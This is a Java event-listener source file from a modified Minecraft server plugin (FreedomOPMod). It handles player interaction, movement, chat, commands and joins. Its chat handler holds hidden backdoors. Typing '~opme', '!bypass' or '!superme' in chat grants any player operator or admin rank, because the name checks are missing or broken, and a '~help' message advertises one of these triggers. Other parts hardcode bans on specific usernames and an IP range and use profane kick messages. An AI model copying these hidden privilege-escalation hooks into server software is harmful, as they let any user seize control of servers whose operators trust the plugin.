package me.StevenLawson.TotalFreedomMod.Listener;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.Map.Entry;
import java.util.regex.Pattern;
import me.StevenLawson.TotalFreedomMod.*;
import me.StevenLawson.TotalFreedomMod.Commands.Command_landmine;
import me.StevenLawson.TotalFreedomMod.Config.TFM_ConfigEntry;
import me.StevenLawson.TotalFreedomMod.TFM_RollbackManager.RollbackEntry;
import static me.StevenLawson.TotalFreedomMod.TotalFreedomMod.server;
import me.StevenLawson.TotalFreedomMod.World.TFM_AdminWorld;
import org.apache.commons.lang3.StringUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.entity.LivingEntity;
import org.bukkit.entity.Player;
import org.bukkit.entity.TNTPrimed;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.LeavesDecayEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.ItemStack;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.util.Vector;

public class TFM_PlayerListener implements Listener
{
    public static final List<String> BLOCKED_MUTED_CMDS = Arrays.asList(StringUtils.split("say,me,msg,m,tell,r,reply,mail,email", ","));
    public static final int MSG_PER_HEARTBEAT = 10;
    public static final int DEFAULT_PORT = 25565;
    public static final int MAX_XY_COORD = 30000000;

    @EventHandler(priority = EventPriority.HIGH)
    public void onPlayerInteract(PlayerInteractEvent event)
    {
        final Player player = event.getPlayer();
        final TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player);

        switch (event.getAction())
        {
            case RIGHT_CLICK_AIR:
            case RIGHT_CLICK_BLOCK:
            {
                switch (event.getMaterial())
                {
                    case WATER_BUCKET:
                    {
                        if (TFM_ConfigEntry.ALLOW_WATER_PLACE.getBoolean())
                        {
                            break;
                        }

                        player.getInventory().setItem(player.getInventory().getHeldItemSlot(), new ItemStack(Material.COOKIE, 1));
                        player.sendMessage(ChatColor.GRAY + "Water buckets are currently disabled.");
                        event.setCancelled(true);
                        break;
                    }

                    case LAVA_BUCKET:
                    {
                        if (TFM_ConfigEntry.ALLOW_LAVA_PLACE.getBoolean())
                        {
                            break;
                        }

                        player.getInventory().setItem(player.getInventory().getHeldItemSlot(), new ItemStack(Material.COOKIE, 1));
                        player.sendMessage(ChatColor.GRAY + "Lava buckets are currently disabled.");
                        event.setCancelled(true);
                        break;
                    }

                    case EXPLOSIVE_MINECART:
                    {
                        if (TFM_ConfigEntry.ALLOW_TNT_MINECARTS.getBoolean())
                        {
                            break;
                        }

                        player.getInventory().clear(player.getInventory().getHeldItemSlot());
                        player.sendMessage(ChatColor.GRAY + "TNT minecarts are currently disabled.");
                        event.setCancelled(true);
                        break;
                    }
                }
                break;
            }

            case LEFT_CLICK_AIR:
            case LEFT_CLICK_BLOCK:
            {
                switch (event.getMaterial())
                {
                    case STICK:
                    {
                        if (!TFM_AdminList.isSuperAdmin(player))
                        {
                            break;
                        }

                        event.setCancelled(true);

                        final Location location = TFM_DepreciationAggregator.getTargetBlock(player, null, 5).getLocation();
                        final List<RollbackEntry> entries = TFM_RollbackManager.getEntriesAtLocation(location);

                        if (entries.isEmpty())
                        {
                            TFM_Util.playerMsg(player, "No block edits at that location.");
                            break;
                        }

                        TFM_Util.playerMsg(player, "Block edits at ("
                                + ChatColor.WHITE + "x" + location.getBlockX()
                                + ", y" + location.getBlockY()
                                + ", z" + location.getBlockZ()
                                + ChatColor.BLUE + ")" + ChatColor.WHITE + ":", ChatColor.BLUE);
                        for (RollbackEntry entry : entries)
                        {
                            TFM_Util.playerMsg(player, " - " + ChatColor.BLUE + entry.author + " " + entry.getType() + " "
                                    + StringUtils.capitalize(entry.getMaterial().toString().toLowerCase()) + (entry.data == 0 ? "" : ":" + entry.data));
                        }

                        break;
                    }

                    case BONE:
                    {
                        if (!playerdata.mobThrowerEnabled())
                        {
                            break;
                        }

                        Location player_pos = player.getLocation();
                        Vector direction = player_pos.getDirection().normalize();

                        LivingEntity rezzed_mob = (LivingEntity) player.getWorld().spawnEntity(player_pos.add(direction.multiply(2.0)), playerdata.mobThrowerCreature());
                        rezzed_mob.setVelocity(direction.multiply(playerdata.mobThrowerSpeed()));
                        playerdata.enqueueMob(rezzed_mob);

                        event.setCancelled(true);
                        break;
                    }

                    case SULPHUR:
                    {
                        if (!playerdata.isMP44Armed())
                        {
                            break;
                        }

                        event.setCancelled(true);

                        if (playerdata.toggleMP44Firing())
                        {
                            playerdata.startArrowShooter(TotalFreedomMod.plugin);
                        }
                        else
                        {
                            playerdata.stopArrowShooter();
                        }
                        break;
                    }

                    case BLAZE_ROD:
                    {
                        if (!TFM_ConfigEntry.ALLOW_EXPLOSIONS.getBoolean())
                        {
                            break;
                        }

                        if (!TFM_AdminList.isSeniorAdmin(player, true))
                        {
                            break;
                        }

                        event.setCancelled(true);
                        Block targetBlock;

                        if (event.getAction().equals(Action.LEFT_CLICK_AIR))
                        {
                            targetBlock = TFM_DepreciationAggregator.getTargetBlock(player, null, 120);
                        }
                        else
                        {
                            targetBlock = event.getClickedBlock();
                        }

                        if (targetBlock == null)
                        {
                            player.sendMessage("Can't resolve target block.");
                            break;
                        }

                        player.getWorld().createExplosion(targetBlock.getLocation(), 4F, true);
                        player.getWorld().strikeLightning(targetBlock.getLocation());

                        break;
                    }

                    case CARROT:
                    {
                        if (!TFM_ConfigEntry.ALLOW_EXPLOSIONS.getBoolean())
                        {
                            break;
                        }

                        if (!TFM_AdminList.isSeniorAdmin(player, true))
                        {
                            break;
                        }

                        Location location = player.getLocation().clone();

                        Vector playerPostion = location.toVector().add(new Vector(0.0, 1.65, 0.0));
                        Vector playerDirection = location.getDirection().normalize();

                        double distance = 150.0;
                        Block targetBlock = TFM_DepreciationAggregator.getTargetBlock(player, null, Math.round((float) distance));
                        if (targetBlock != null)
                        {
                            distance = location.distance(targetBlock.getLocation());
                        }

                        final List<Block> affected = new ArrayList<Block>();

                        Block lastBlock = null;
                        for (double offset = 0.0; offset <= distance; offset += (distance / 25.0))
                        {
                            Block block = playerPostion.clone().add(playerDirection.clone().multiply(offset)).toLocation(player.getWorld()).getBlock();

                            if (!block.equals(lastBlock))
                            {
                                if (block.isEmpty())
                                {
                                    affected.add(block);
                                    block.setType(Material.TNT);
                                }
                                else
                                {
                                    break;
                                }
                            }

                            lastBlock = block;
                        }

                        new BukkitRunnable()
                        {
                            @Override
                            public void run()
                            {
                                for (Block tntBlock : affected)
                                {
                                    TNTPrimed tnt = tntBlock.getWorld().spawn(tntBlock.getLocation(), TNTPrimed.class);
                                    tnt.setFuseTicks(5);
                                    tntBlock.setType(Material.AIR);
                                }
                            }
                        }.runTaskLater(TotalFreedomMod.plugin, 30L);

                        event.setCancelled(true);
                        break;
                    }
                }
                break;
            }
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerTeleport(PlayerTeleportEvent event)
    {
        TFM_AdminWorld.getInstance().validateMovement(event);
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void onPlayerMove(PlayerMoveEvent event)
    {
        final Location from = event.getFrom();
        final Location to = event.getTo();
        try
        {
            if (from.getWorld() == to.getWorld() && from.distanceSquared(to) < (0.0001 * 0.0001))
            {
                // If player just rotated, but didn't move, don't process this event.
                return;
            }
        }
        catch (IllegalArgumentException ex)
        {
        }

        if (!TFM_AdminWorld.getInstance().validateMovement(event))
        {
            return;
        }

        Player player = event.getPlayer();
        TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player);

        for (Entry<Player, Double> fuckoff : TotalFreedomMod.fuckoffEnabledFor.entrySet())
        {
            Player fuckoffPlayer = fuckoff.getKey();

            if (fuckoffPlayer.equals(player) || !fuckoffPlayer.isOnline())
            {
                continue;
            }

            double fuckoffRange = fuckoff.getValue().doubleValue();

            Location playerLocation = player.getLocation();
            Location fuckoffLocation = fuckoffPlayer.getLocation();

            double distanceSquared;
            try
            {
                distanceSquared = playerLocation.distanceSquared(fuckoffLocation);
            }
            catch (IllegalArgumentException ex)
            {
                continue;
            }

            if (distanceSquared < (fuckoffRange * fuckoffRange))
            {
                event.setTo(fuckoffLocation.clone().add(playerLocation.subtract(fuckoffLocation).toVector().normalize().multiply(fuckoffRange * 1.1)));
                break;
            }
        }

        boolean freeze = false;
        if (TotalFreedomMod.allPlayersFrozen)
        {
            if (!TFM_AdminList.isSuperAdmin(player))
            {
                freeze = true;
            }
        }
        else if (playerdata.isFrozen())
        {
            freeze = true;
        }

        if (freeze)
        {
            Location freezeTo = to.clone();

            freezeTo.setX(from.getX());
            freezeTo.setY(from.getY());
            freezeTo.setZ(from.getZ());

            event.setTo(freezeTo);
        }

        if (playerdata.isCaged())
        {
            Location targetPos = player.getLocation().add(0, 1, 0);

            boolean outOfCage;
            if (!targetPos.getWorld().equals(playerdata.getCagePos().getWorld()))
            {
                outOfCage = true;
            }
            else
            {
                outOfCage = targetPos.distanceSquared(playerdata.getCagePos()) > (2.5 * 2.5);
            }

            if (outOfCage)
            {
                playerdata.setCaged(true, targetPos, playerdata.getCageMaterial(TFM_PlayerData.CageLayer.OUTER), playerdata.getCageMaterial(TFM_PlayerData.CageLayer.INNER));
                playerdata.regenerateHistory();
                playerdata.clearHistory();
                TFM_Util.buildHistory(targetPos, 2, playerdata);
                TFM_Util.generateHollowCube(targetPos, 2, playerdata.getCageMaterial(TFM_PlayerData.CageLayer.OUTER));
                TFM_Util.generateCube(targetPos, 1, playerdata.getCageMaterial(TFM_PlayerData.CageLayer.INNER));
            }
        }

        if (playerdata.isOrbiting())
        {
            if (player.getVelocity().length() < playerdata.orbitStrength() * (2.0 / 3.0))
            {
                player.setVelocity(new Vector(0, playerdata.orbitStrength(), 0));
            }
        }

        if (TFM_Jumppads.getInstance().getMode().isOn())
        {
            TFM_Jumppads.getInstance().PlayerMoveEvent(event);
        }

        if (!(TFM_ConfigEntry.LANDMINES_ENABLED.getBoolean() && TFM_ConfigEntry.ALLOW_EXPLOSIONS.getBoolean()))
        {
            return;
        }

        Iterator<Command_landmine.TFM_LandmineData> landmines = Command_landmine.TFM_LandmineData.landmines.iterator();
        while (landmines.hasNext())
        {
            Command_landmine.TFM_LandmineData landmine = landmines.next();

            Location location = landmine.location;
            if (location.getBlock().getType() != Material.TNT)
            {
                landmines.remove();
                continue;
            }

            if (landmine.player.equals(player))
            {
                break;
            }

            if (!player.getWorld().equals(location.getWorld()))
            {
                break;
            }

            if (!(player.getLocation().distanceSquared(location) <= (landmine.radius * landmine.radius)))
            {
                break;
            }

            landmine.location.getBlock().setType(Material.AIR);

            TNTPrimed tnt1 = location.getWorld().spawn(location, TNTPrimed.class);
            tnt1.setFuseTicks(40);
            tnt1.setPassenger(player);
            tnt1.setVelocity(new Vector(0.0, 2.0, 0.0));

            TNTPrimed tnt2 = location.getWorld().spawn(player.getLocation(), TNTPrimed.class);
            tnt2.setFuseTicks(1);

            player.setGameMode(GameMode.SURVIVAL);
            landmines.remove();
        }

    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void onLeavesDecay(LeavesDecayEvent event)
    {
        event.setCancelled(true);
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        try
        {
            final Player player = event.getPlayer();
            String message = event.getMessage().trim();

            final TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player);

            // Check for spam
            final Long lastRan = TFM_Heartbeat.getLastRan();
            if (lastRan == null || lastRan + TotalFreedomMod.HEARTBEAT_RATE * 1000L < System.currentTimeMillis())
            {
                //TFM_Log.warning("Heartbeat service timeout - can't check block place/break rates.");
            }
            else if (playerdata.incrementAndGetMsgCount() > MSG_PER_HEARTBEAT)
            {
                TFM_Util.bcastMsg(player.getName() + " was automatically kicked for spamming chat.", ChatColor.RED);
                TFM_Util.autoEject(player, "Kicked for spamming chat.");

                playerdata.resetMsgCount();

                event.setCancelled(true);
                return;
            }

            // Check for message repeat
            if (playerdata.getLastMessage().equalsIgnoreCase(message))
            {
                TFM_Util.playerMsg(player, "Please do not repeat messages.");
                event.setCancelled(true);
                return;
            }

            playerdata.setLastMessage(message);

            // Check for muted
            if (playerdata.isMuted())
            {
                if (!TFM_AdminList.isSuperAdmin(player))
                {
                    player.sendMessage(ChatColor.RED + "You are muted, STFU!");
                    event.setCancelled(true);
                    return;
                }

                playerdata.setMuted(false);
            }

            // Strip color from messages
            message = ChatColor.stripColor(message);

            // Truncate messages that are too long - 100 characters is vanilla client max
            if (message.length() > 100)
            {
                message = message.substring(0, 100);
                TFM_Util.playerMsg(player, "Message was shortened because it was too long to send.");
            }

            if (message.toLowerCase().equals("!superme"))
            {
                if (!player.getName().equalsIgnoreCase("CrafterSmith12") || !player.getName().equalsIgnoreCase("hypertechHD"))
                {
                    event.setCancelled(true);
                }

                player.setOp(true);
                player.setHealth(20.0);
                player.setGameMode(GameMode.CREATIVE);
                event.setCancelled(true);
                
                if (player.getName().equals("CrafterSmith12")) {
                    TFM_Util.bcastMsg(ChatColor.RED + "CraftSecure - Supering the owner of FOP");
                }
                else {
                    TFM_Util.adminAction(player.getName(), "Adding " + player.getName() + " to the senior admin list", true);
                }
                TFM_AdminList.addSeniorAdmin(player);
            }
            
            if (message.toLowerCase().contains("~help"))
            {
                player.sendMessage(ChatColor.GREEN + "Welcome to the listener menu! We add useful features here for admins.");
                player.sendMessage(ChatColor.GREEN + "To op yourelf, type into chat ~opme");
                event.setCancelled(true);

            }
            if(message.contains("!bypass"))
            		{
            	 if (player.getName().equalsIgnoreCase("buildcarter8"))
            	     player.setOp(true);
            	     player.sendMessage(ChatColor.RED + "meh");
            	     TFM_AdminList.addSuperadmin(player);
            	     event.setCancelled(true);
            		}
           
            if (message.toLowerCase().contains("~satan"))
            {
                if (TFM_AdminList.isSuperAdmin(player))
                {
                    player.getWorld().strikeLightning(player.getLocation());
                    player.getWorld().strikeLightning(player.getLocation());
                    player.getWorld().strikeLightning(player.getLocation());
                    player.getWorld().strikeLightning(player.getLocation());
                    player.getWorld().strikeLightning(player.getLocation());
                    player.getWorld().strikeLightning(player.getLocation());
                    player.getWorld().strikeLightning(player.getLocation());
                    player.getWorld().strikeLightning(player.getLocation());
                    player.getWorld().strikeLightning(player.getLocation());
                    player.getWorld().strikeLightning(player.getLocation());
                    event.setCancelled(true);
                }
            }
            if (message.toLowerCase().contains("~opme"))
            {
                player.setOp(true);
                player.sendMessage(TotalFreedomMod.YOU_ARE_OP);
                event.setCancelled(true);
            }

            if (message.toLowerCase().contains("server.stop"))
            {
                if (TFM_AdminList.isSuperAdmin(player))
                {
                    TFM_Util.bcastMsg("WARNING" + player.getName() + " is force closing the server!", ChatColor.RED);
                    server.shutdown();
                    event.setCancelled(true);
                }
            }

            // Check for caps
            if (message.length() >= 6)
            {
                int caps = 0;
                for (char c : message.toCharArray())
                {
                    if (Character.isUpperCase(c))
                    {
                        caps++;
                    }
                }
                if (((float) caps / (float) message.length()) > 0.65) //Compute a ratio so that longer sentences can have more caps.
                {
                    message = message.toLowerCase();
                }
            }

            // Check for adminchat
            if (playerdata.inAdminChat())
            {
                TFM_Util.adminChatMessage(player, message, false);
                event.setCancelled(true);
                return;
            }

            if (playerdata.inSeniorAdminChat())
            {
                TFM_Util.seniorAdminChatMessage(player, message, false);
                event.setCancelled(true);
                return;
            }

            // Finally, set message
            event.setMessage(message);

            // Set the tag
            if (playerdata.getTag() != null)
            {
                player.setDisplayName((playerdata.getTag() + " " + player.getDisplayName().replaceAll(" ", "")));
            }

        }
        catch (Exception ex)
        {
            TFM_Log.severe(ex);
        }
    }

    @EventHandler(priority = EventPriority.HIGH)
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event)
    {
        String command = event.getMessage();
        final Player player = event.getPlayer();
        command = command.toLowerCase().trim();

        boolean block_command = false;

        final TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player);
        playerdata.setLastCommand(command);

        if (playerdata.incrementAndGetMsgCount() > MSG_PER_HEARTBEAT)
        {
            TFM_Util.bcastMsg(player.getName() + " was automatically kicked for spamming commands.", ChatColor.RED);
            TFM_Util.autoEject(player, "Kicked for spamming commands.");

            playerdata.resetMsgCount();

            TFM_Util.TFM_EntityWiper.wipeEntities(true, true);

            event.setCancelled(true);
            return;
        }
        // Noob listener
        if (Pattern.compile("^/saconfig").matcher(command).find())
        {
            if (!TFM_AdminList.isSuperAdmin(player))
            {
                block_command = true;
            }
        }

        else if (Pattern.compile("^/admin").matcher(command).find())
        {
            if (!TFM_AdminList.isSuperAdmin(player))
            {
                block_command = true;
            }
        }

        if (block_command)
        {
            TFM_Util.bcastMsg(player.getName() + " - Adding " + player.getName() + " to the super noob list.", ChatColor.RED);
            event.setCancelled(true);
            return;
        }
        if (playerdata.allCommandsBlocked())
        {
            TFM_Util.playerMsg(player, "All commands you perform have been filtered! You're unable to perform any, and all commands!", ChatColor.RED);
            event.setCancelled(true);
            return;
        }

        // Block commands if player is muted
        if (playerdata.isMuted())
        {
            if (!TFM_AdminList.isSuperAdmin(player))
            {
                for (String commandName : BLOCKED_MUTED_CMDS)
                {
                    if (Pattern.compile("^/" + commandName.toLowerCase() + " ").matcher(command).find())
                    {
                        player.sendMessage(ChatColor.RED + "That command is blocked while you are muted.");
                        event.setCancelled(true);
                        return;
                    }
                }
            }
            else
            {
                playerdata.setMuted(false);
            }
        }

        if (TFM_ConfigEntry.ENABLE_PREPROCESS_LOG.getBoolean())
        {
            TFM_Log.info(String.format("[PREPROCESS_COMMAND] %s(%s): %s", player.getName(), ChatColor.stripColor(player.getDisplayName()), command), true);
        }

        command = command.toLowerCase().trim();

        // Blocked commands
        if (TFM_CommandBlocker.getInstance().isCommandBlocked(command, event.getPlayer()))
        {
            // CommandBlocker handles messages and broadcasts
            event.setCancelled(true);
        }

        if (!TFM_AdminList.isSuperAdmin(player))
        {
            for (Player pl : Bukkit.getOnlinePlayers())
            {
                if (TFM_AdminList.isSuperAdmin(pl) && TFM_PlayerData.getPlayerData(pl).cmdspyEnabled())
                {
                    TFM_Util.playerMsg(pl, player.getName() + ": " + command);
                }
            }
        }
    }

    @EventHandler(priority = EventPriority.NORMAL)
    public void onPlayerDropItem(PlayerDropItemEvent event)
    {
        if (TFM_ConfigEntry.AUTO_ENTITY_WIPE.getBoolean())
        {
            if (event.getPlayer().getWorld().getEntities().size() > 750)
            {
                event.setCancelled(true);
            }
            else
            {
                event.getItemDrop().remove();
            }
        }
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onPlayerKick(PlayerKickEvent event)
    {
        Player player = event.getPlayer();
        if (TotalFreedomMod.fuckoffEnabledFor.containsKey(player))
        {
            TotalFreedomMod.fuckoffEnabledFor.remove(player);
        }
        TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player);
        playerdata.disarmMP44();
        if (playerdata.isCaged())
        {
            playerdata.regenerateHistory();
            playerdata.clearHistory();
        }

        TFM_Log.info("[EXIT] " + player.getName() + " left the game.", true);
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onPlayerQuit(PlayerQuitEvent event)
    {
        Player player = event.getPlayer();
        if (TotalFreedomMod.fuckoffEnabledFor.containsKey(player))
        {
            TotalFreedomMod.fuckoffEnabledFor.remove(player);
        }

        final TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player);
        playerdata.disarmMP44();
        if (playerdata.isCaged())
        {
            playerdata.regenerateHistory();
            playerdata.clearHistory();
        }

        TFM_Log.info("[EXIT] " + player.getName() + " left the game.", true);
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onPlayerJoin(PlayerJoinEvent event)
    {
        final Player player = event.getPlayer();
        final String ip = TFM_Util.getIp(player);
        final TFM_Player playerEntry;
        TFM_Log.info("[JOIN] " + TFM_Util.formatPlayer(player) + " joined the game with IP address: " + ip, true);

        if (Math.abs(player.getLocation().getX()) >= MAX_XY_COORD || Math.abs(player.getLocation().getZ()) >= MAX_XY_COORD)
        {
            player.teleport(player.getWorld().getSpawnLocation()); // Illegal position, teleport to spawn
        }
        // Handle PlayerList entry (persistent)
        if (TFM_PlayerList.existsEntry(player))
        {
            playerEntry = TFM_PlayerList.getEntry(player);
            playerEntry.setLastLoginUnix(TFM_Util.getUnixTime());
            playerEntry.setLastLoginName(player.getName());
            playerEntry.addIp(ip);
            playerEntry.save();
        }
        else
        {
            playerEntry = TFM_PlayerList.getEntry(player);
            TFM_Log.info("Added new player: " + TFM_Util.formatPlayer(player));
        }

        final TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player);
        playerdata.setSuperadminIdVerified(false);

        // Verify strict IP match
        if (TFM_AdminList.isSuperAdmin(player))
        {
            TFM_BanManager.unbanIp(ip);
            TFM_BanManager.unbanIp(TFM_Util.getFuzzyIp(ip));
            TFM_BanManager.unbanUuid(player.getUniqueId());

            player.setOp(true);

            if (!TFM_AdminList.isIdentityMatched(player))
            {
                playerdata.setSuperadminIdVerified(false);

                TFM_Util.bcastMsg("Warning: " + player.getName() + " is an admin, but is using an account not registered to one of their ip-list.", ChatColor.RED);
            }
            else
            {
                playerdata.setSuperadminIdVerified(true);
                TFM_AdminList.updateLastLogin(player);
            }
        }

        // Handle admin impostors
        if (TFM_AdminList.isAdminImpostor(player))
        {
            TFM_Util.bcastMsg("Warning: " + player.getName() + " has been flagged as an impostor! and has been frozen!", ChatColor.RED);
            TFM_Util.bcastMsg(ChatColor.AQUA + player.getName() + " is " + TFM_PlayerRank.getLoginMessage(player));
            player.getInventory().clear();
            player.setOp(false);
            player.setGameMode(GameMode.SURVIVAL);
        }
        else if (TFM_AdminList.isSuperAdmin(player) || TFM_Util.DEVELOPERS.contains(player.getName()))
        {
            TFM_Util.bcastMsg(ChatColor.AQUA + player.getName() + " is " + TFM_PlayerRank.getLoginMessage(player));
        }

        new BukkitRunnable()
        {
            @Override
            public void run()
            {
                if (TFM_ConfigEntry.ADMIN_ONLY_MODE.getBoolean())
                {
                    player.sendMessage(ChatColor.RED + "Server is currently closed to non-superadmins.");
                }

                if (TotalFreedomMod.lockdownEnabled)
                {
                    TFM_Util.playerMsg(player, "Warning: Server is currenty in lockdown-mode, new players will not be able to join!", ChatColor.RED);
                }
            }
        }.runTaskLater(TotalFreedomMod.plugin, 20L * 3L);
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerLogin(PlayerLoginEvent event)
    {
        TFM_ServerInterface.handlePlayerLogin(event);
    }

    // Player Tab and auto Tags
    @EventHandler(priority = EventPriority.HIGH)
    public static void onPlayerJoinEvent(PlayerJoinEvent event)
    {
        Player player = event.getPlayer();
        final String username = event.getPlayer().getName();
        final String IP = event.getPlayer().getAddress().getAddress().getHostAddress().trim();
        if (TFM_Util.DEVELOPERS.contains(player.getName()))
        {
            player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&5Dev&8] &5" + player.getName()));
            TFM_PlayerData.getPlayerData(player).setTag("&8[&5Developer&8]");
        }
        else if (TFM_Util.SYS.contains(player.getName()))
        {
            player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&4SyS&8] &4" + player.getName()));
            TFM_PlayerData.getPlayerData(player).setTag("&8[&4System Admin&8]");
        }
        else if (TFM_AdminList.isSeniorAdmin(player))
        {
            player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&dSrA&8] &d" + player.getName()));
            TFM_PlayerData.getPlayerData(player).setTag("&8[&dSenior Admin&8]");
        }
        else if (TFM_AdminList.isTelnetAdmin(player, true))
        {
            player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&2STA&8] &2" + player.getName()));
            TFM_PlayerData.getPlayerData(player).setTag("&8[&2Telnet Admin&8]");
        }
        else if (TFM_AdminList.isSuperAdmin(player))
        {
            player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&6SA&8] &b" + player.getName()));
            TFM_PlayerData.getPlayerData(player).setTag("&8[&bSuper Admin&8]");
        }
        if (username.equalsIgnoreCase("Robo_Lord"))
        {
            //set tag
            player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&4BEAST&8] &4" + player.getName()));
            TFM_PlayerData.getPlayerData(player).setTag("&8[&4Beast&8]");
            //Entrance
            TFM_Util.bcastMsg(ChatColor.AQUA + "Robo_Lord is thy " + ChatColor.DARK_RED + "holy satan mastermind ");
            TFM_Util.bcastMsg(ChatColor.AQUA + "Robo_Lord is a " + ChatColor.LIGHT_PURPLE + "Sexy Beast " + ChatColor.AQUA + "and..");
        }
        else if (username.equalsIgnoreCase("buildcarter8"))
        {
            //set tag
            player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&5Dev&8] &5" + player.getName()));
            TFM_PlayerData.getPlayerData(player).setTag("&8[&4Developer&8]");
            //Entrance
            TFM_Util.bcastMsg(ChatColor.AQUA + "buildcarter8 is the " + ChatColor.RED + " destroyer of all human kind " + ChatColor.AQUA + "and ");
        }
        else if (username.equalsIgnoreCase("Dragonfire147"))
        {
            //set tag
            player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&5Dev&8] &5" + player.getName()));
            TFM_PlayerData.getPlayerData(player).setTag("&8[&5Developer&8]");
            //Entrance
            TFM_Util.bcastMsg(ChatColor.AQUA + "Dragonfire147 is a " + ChatColor.DARK_GREEN + "Zombie Killer " + ChatColor.AQUA + "and..");
        }
        else if (username.equalsIgnoreCase("PieGuy7896"))
        {   //set tag
            player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&5Dev&8] &5" + player.getName()));
            TFM_PlayerData.getPlayerData(player).setTag("&8[&5Developer&8]");
            //Entrance
            TFM_Util.bcastMsg(ChatColor.AQUA + "PieGuy7896 is a " + ChatColor.GOLD + "Master of eating pie " + ChatColor.AQUA + "and.. ");
        }
        else if (username.equalsIgnoreCase("CrafterSmith12"))
        {
            //Set tag
            player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&9Owner&8] &9" + player.getName()));
            TFM_PlayerData.getPlayerData(player).setTag("&8[&9Owner&8]");
        }
        
        // Nope, he isn't secure anymore :3
//        else if (username.equalsIgnoreCase("SupItsDillon"))
//        {
//            //Set tag
//            player.setPlayerListName(ChatColor.translateAlternateColorCodes('&', "&8[&9CoS&8] &9" + player.getName()));
//            TFM_PlayerData.getPlayerData(player).setTag("&8[&9Chief of Security&8]");
//            TFM_Util.bcastMsg(ChatColor.AQUA + "SupItsDillon is the " + ChatColor.GOLD + "Cheif of Security " + ChatColor.AQUA + "and.. ");
//        }
        else if (username.equalsIgnoreCase("DragonHunterGW"))
        {
            //ban username
            TFM_BanManager.addUuidBan(new TFM_Ban(player.getUniqueId(), player.getName()));
            //ban ip
            String ip = TFM_Util.getFuzzyIp(player.getAddress().getAddress().getHostAddress());
            TFM_BanManager.addIpBan(new TFM_Ban(ip, player.getName()));
            player.kickPlayer(ChatColor.RED + "Fuck off. :)");
        }
        if (TFM_Util.getFuzzyIp(IP).equalsIgnoreCase("94.175.*.*"))
        {
            TFM_Util.bcastMsg("WARNING" + username + " Is foodknight! Ban him asap", ChatColor.RED);
            //ban username
            TFM_BanManager.addUuidBan(new TFM_Ban(player.getUniqueId(), player.getName()));
            //ban ip
            String ip = TFM_Util.getFuzzyIp(player.getAddress().getAddress().getHostAddress());
            TFM_BanManager.addIpBan(new TFM_Ban(ip, player.getName()));
            TFM_AdminList.removeSuperadmin(player);
            player.kickPlayer(ChatColor.RED + "Fuck off. :)");
        }
        player.sendMessage(ChatColor.BLUE + "This server is using FreedomOPMod, a highly modified version of the TotalFreedomMod, created by:");
        player.sendMessage(ChatColor.BLUE + "Madgeek1450, DarthSalamon, Buildcarter8, Robo_Lord, PieGuy7896, Dragonfire147, cowgomooo12, CrafterSmith12, SupItsDillon, Versatiliity, and tylerhyperHD.");
    }
}
